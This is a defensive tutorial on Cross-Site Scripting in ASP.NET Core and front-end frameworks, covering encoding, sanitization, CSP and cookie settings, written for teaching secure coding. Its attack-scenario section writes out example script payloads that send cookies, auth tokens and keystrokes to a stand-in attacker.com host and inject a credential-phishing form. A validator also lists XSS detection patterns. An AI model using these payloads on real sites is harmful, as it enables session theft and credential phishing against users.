## Introduction

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. These scripts execute in the victim's browser with the same privileges as the web application, enabling attackers to steal cookies, session tokens, or sensitive data, impersonate users, or deface websites. XSS remains one of the most prevalent web vulnerabilities despite modern framework protections.

## Key Concepts Summary

### Types of XSS Attacks

```html
<!-- 1. STORED XSS (Persistent) -->
<!-- Attacker submits malicious comment on a blog -->
<form action="/comments" method="post">
    <input name="comment" value="Great article! <script>steal_cookies()</script>">
    <button>Submit</button>
</form>

<!-- Without proper encoding, this renders as: -->
<div class="comment">
    Great article! <script>steal_cookies()</script>
</div>
<!-- Script executes for EVERY user who views the page! -->

<!-- 2. REFLECTED XSS (Non-persistent) -->
<!-- Attacker sends victim a malicious link -->
https://example.com/search?q=<script>alert(document.cookie)</script>

<!-- If search term is reflected without encoding: -->
<h1>Search results for: <script>alert(document.cookie)</script></h1>
<!-- Script executes immediately -->

<!-- 3. DOM-BASED XSS -->
<!-- Vulnerable JavaScript code -->
<script>
    // Reading from URL without sanitization
    var query = new URLSearchParams(window.location.search).get('name');
    document.getElementById('welcome').innerHTML = 'Welcome ' + query;
</script>

<!-- Malicious URL -->
https://example.com/page?name=<img src=x onerror="alert('XSS')">
```

### Real-World Attack Scenarios

```javascript
// Scenario 1: Cookie Theft
<script>
    // Send user's cookies to attacker's server
    var cookies = document.cookie;
    fetch('https://attacker.com/steal?cookies=' + encodeURIComponent(cookies));
</script>

// Scenario 2: Session Hijacking
<script>
    // Steal session token
    var token = localStorage.getItem('auth_token');
    fetch('https://attacker.com/steal?token=' + token);
</script>

// Scenario 3: Keylogging
<script>
    // Log all keystrokes
    document.addEventListener('keypress', function(e) {
        fetch('https://attacker.com/log?key=' + e.key);
    });
</script>

// Scenario 4: Phishing
<script>
    // Inject fake login form
    document.body.innerHTML = `
        <form action="https://attacker.com/phish" method="post">
            <input name="username" placeholder="Username">
            <input name="password" type="password" placeholder="Password">
            <button>Login</button>
        </form>
    `;
</script>
```

### Prevention in ASP.NET Core

```csharp
// ASP.NET Core Razor automatically encodes output
@model CommentViewModel

<!-- SAFE: Razor automatically HTML-encodes -->
<div class="comment">
    @Model.CommentText
</div>

<!-- If CommentText = "<script>alert('xss')</script>" -->
<!-- Renders as: &lt;script&gt;alert('xss')&lt;/script&gt; -->
<!-- Browser displays text, doesn't execute script -->

// DANGEROUS: Using Html.Raw() bypasses encoding
<div class="comment">
    @Html.Raw(Model.CommentText) <!-- DON'T DO THIS! -->
</div>

// If you MUST render HTML (e.g., rich text editor)
// Use a sanitization library
public class CommentService
{
    public string SanitizeHtml(string unsafeHtml)
    {
        var sanitizer = new HtmlSanitizer();
        
        // Allow only safe tags
        sanitizer.AllowedTags.Clear();
        sanitizer.AllowedTags.Add("p");
        sanitizer.AllowedTags.Add("br");
        sanitizer.AllowedTags.Add("strong");
        sanitizer.AllowedTags.Add("em");
        
        // Disallow dangerous attributes
        sanitizer.AllowedAttributes.Clear();
        
        return sanitizer.Sanitize(unsafeHtml);
    }
}

// Usage in controller
[HttpPost]
public async Task<IActionResult> CreateComment(CreateCommentRequest request)
{
    var sanitizedContent = _commentService.SanitizeHtml(request.Content);
    
    var comment = new Comment
    {
        Content = sanitizedContent,
        AuthorId = User.GetUserId()
    };
    
    await _repository.SaveAsync(comment);
    return Ok();
}
```

### Context-Specific Encoding

```csharp
// Different contexts require different encoding

// 1. HTML Context
public class HtmlEncoder
{
    public string Encode(string input)
    {
        return System.Net.WebUtility.HtmlEncode(input);
        // < becomes &lt;
        // > becomes &gt;
        // " becomes &quot;
        // & becomes &amp;
    }
}

// 2. JavaScript Context
<script>
    // BAD: Injecting directly into JS
    var userName = "@Model.UserName"; // Vulnerable if username contains quotes
    
    // GOOD: Use JSON encoding
    var userName = @Html.Raw(Json.Serialize(Model.UserName));
</script>

// 3. URL Context
public class UrlEncoder
{
    public string Encode(string input)
    {
        return System.Web.HttpUtility.UrlEncode(input);
    }
}

// Razor example
<a href="/search?q=@Url.Encode(Model.Query)">Search</a>

// 4. CSS Context
<style>
    /* NEVER inject user input into CSS */
    .user-color {
        /* BAD: color: @Model.UserColor; */
        /* Attacker could inject: red; } body { display: none; */
    }
</style>
```

### Content Security Policy (CSP)

```csharp
// Implement CSP headers to prevent inline scripts
public class SecurityHeadersMiddleware
{
    public async Task InvokeAsync(HttpContext context)
    {
        // Strict CSP that blocks inline scripts
        context.Response.Headers.Add("Content-Security-Policy",
            "default-src 'self'; " +
            "script-src 'self'; " +                    // Only scripts from same origin
            "style-src 'self' 'unsafe-inline'; " +     // Styles from same origin + inline
            "img-src 'self' data: https:; " +          // Images from same origin, data URIs, HTTPS
            "font-src 'self'; " +
            "connect-src 'self'; " +                   // AJAX/fetch only to same origin
            "frame-ancestors 'none'; " +               // Prevent clickjacking
            "base-uri 'self'; " +
            "form-action 'self'");                     // Forms can only submit to same origin
        
        await _next(context);
    }
}

// For apps that need inline scripts, use nonces
public class CspWithNonceMiddleware
{
    public async Task InvokeAsync(HttpContext context)
    {
        // Generate random nonce for this request
        var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(16));
        context.Items["csp-nonce"] = nonce;
        
        context.Response.Headers.Add("Content-Security-Policy",
            $"default-src 'self'; script-src 'self' 'nonce-{nonce}'");
        
        await _next(context);
    }
}

// In Razor view
<script nonce="@Context.Items["csp-nonce"]">
    // This inline script is allowed because it has the correct nonce
    console.log('Allowed by CSP');
</script>
```

### Framework Protection (React, Angular, Vue)

```javascript
// React automatically escapes values in JSX
function Comment({ text }) {
    // SAFE: React escapes by default
    return <div>{text}</div>;
    
    // DANGEROUS: dangerouslySetInnerHTML bypasses protection
    return <div dangerouslySetInnerHTML={{ __html: text }} />; // DON'T!
}

// Angular automatically sanitizes values
@Component({
    template: `
        <!-- SAFE: Angular sanitizes by default -->
        <div>{{ userComment }}</div>
        
        <!-- DANGEROUS: bypassSecurityTrustHtml bypasses protection -->
        <div [innerHTML]="getTrustedHtml()"></div> <!-- DON'T! -->
    `
})
export class CommentComponent {
    constructor(private sanitizer: DomSanitizer) {}
    
    // If you must render HTML, sanitize it first
    getSafeHtml(unsafeHtml: string) {
        // Angular sanitizer removes dangerous content
        return this.sanitizer.sanitize(SecurityContext.HTML, unsafeHtml);
    }
}

// Vue.js escapes by default
<template>
    <!-- SAFE: Vue escapes by default -->
    <div>{{ userComment }}</div>
    
    <!-- DANGEROUS: v-html bypasses protection -->
    <div v-html="userComment"></div> <!-- DON'T! -->
</template>
```

### Input Validation and Sanitization

```csharp
// Always validate input (defense in depth)
public class CommentValidator
{
    public ValidationResult Validate(string comment)
    {
        var errors = new List<string>();
        
        // Length check
        if (string.IsNullOrWhiteSpace(comment))
        {
            errors.Add("Comment cannot be empty");
        }
        else if (comment.Length > 1000)
        {
            errors.Add("Comment too long");
        }
        
        // Check for suspicious patterns (not foolproof, but adds defense)
        var dangerousPatterns = new[]
        {
            @"<script[\s\S]*?>[\s\S]*?</script>",
            @"javascript:",
            @"on\w+\s*=",  // onerror=, onclick=, etc.
            @"<iframe",
            @"<object",
            @"<embed"
        };
        
        foreach (var pattern in dangerousPatterns)
        {
            if (Regex.IsMatch(comment, pattern, RegexOptions.IgnoreCase))
            {
                errors.Add("Comment contains potentially dangerous content");
                break;
            }
        }
        
        return errors.Any() 
            ? ValidationResult.Failure(errors) 
            : ValidationResult.Success();
    }
}
```

### HttpOnly and Secure Cookies

```csharp
// Protect cookies from XSS attacks
public class Startup
{
    public void ConfigureServices(IServiceCollection services)
    {
        services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
            .AddCookie(options =>
            {
                options.Cookie.HttpOnly = true;      // Not accessible via JavaScript
                options.Cookie.SecurePolicy = CookieSecurePolicy.Always;  // HTTPS only
                options.Cookie.SameSite = SameSiteMode.Strict;  // CSRF protection
            });
    }
}

// Even if XSS exists, HttpOnly cookies can't be stolen via document.cookie
```
